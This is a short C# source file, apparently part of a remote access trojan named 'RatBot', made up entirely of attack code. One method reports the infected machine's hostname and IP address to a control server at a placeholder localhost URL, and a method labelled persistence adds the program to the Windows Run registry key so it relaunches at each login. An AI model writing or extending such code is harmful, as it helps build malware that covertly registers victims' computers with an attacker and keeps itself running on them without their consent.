﻿//-- for further improvement: put all webclient in try-catch

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace RatBot
{
    internal class ClientAdder
    {
        public static void addNewClient(WebClient wc)
        {
            string name = Dns.GetHostName();
            string ip = Dns.GetHostByName(name).AddressList[0].ToString();


            string post = "name=" + name + "&ip=" + ip;
            wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            wc.UploadString("http://127.0.0.1/addClient.php", post);
        }

        //--Persistence
        public static void runAtStartup()
        {
            Microsoft.Win32.RegistryKey regKey =
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            regKey.SetValue("RatBot", Process.GetCurrentProcess().MainModule.FileName);
            regKey.Dispose();
            regKey.Close();
        }
    }
}
